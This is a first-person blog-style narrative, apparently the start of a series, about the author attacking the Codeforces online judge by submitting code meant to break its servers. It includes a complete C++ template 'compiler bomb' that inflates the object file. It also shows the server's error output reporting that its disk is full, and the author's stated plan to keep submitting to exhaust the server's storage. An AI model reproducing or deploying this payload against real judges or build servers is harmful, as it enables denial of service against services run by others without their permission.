The Start

How it all started!

Prolouge:

It was a quiet night and I had just woken up from a not very comfortable sleep. As always, I open up Codeforces.com and check what people are saying and look for a problem to solve. However, something was different. I was very irritated, I had failed to solve one dynamic programming challenge and I was pissed off. It was time for codeofrces to be put to rest. Or so I thought.

Epilouge:

Codeforces is the biggest programming contests platform right now, but that didn’t matter. To me, codeforces was just software that ran untrusted code. I saw an opportunity. I write some code and they run it ON THEIR MACHINES! I thought to myself, how hard could it be to break this website when I hypothetically could feed the host with all the bad stuff you can think of? I was a naive but not far from the truth.

For some context, codeforces has a field that let’s you send some code after specifying in which language/compiler your code wants to use and it’s compiled and then ran on some server and you’re passed the response to see. Basic stuff that online judges do.

The first thing that came to my mind was trying to break the compiler. I remembered an article I had read about compiler bombs and decided to try that and see if they had correct compiler flags that could prevent such a trivial problem from occuring and to my surprise: they did not!

#define Z struct X
#define T template <int N
T, int M = N > Z;

struct Y {
	static int f() {
		return 0;
	}
};

T > Z < N, 0 >: Y {};
T > Z < 0, N >: Y {};
T, int M > Z {
static int f() {
	static int x[100000] = {
			X < N - 1,
			M > ::f() + X < N,
			M - 1 > ::f()
	};
}
};
int x = X <80> ::f();

int main() {}

The idea behind this was that I knew the above code generated a huge object file by creating too many segments(more than 2^16 - 1) and that the server where this code was compiled had to have some sort of size limit. I was both right and wrong. After sending the code to the server I got a return that said:

Can't compile file:
C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Assembler messages:
C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: cannot fill 256 bytes in section .data$_ZZN1XILi76ELi76EE1fEvE1x of C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o because: 'No space left on device'
C:\Users\CONTES~1\AppData\Local\Temp\ccQIO7Gm.s: Fatal error: can't close C:\Users\CONTES~1\AppData\Local\Temp\ccOE4Zfv.o: No space left on device

Which was good that I was able to hault the checker from cleaning the temp files and now I can just keep sending codes to somehow deplete the server’s storage. That was too lame and I had to dig deeper.
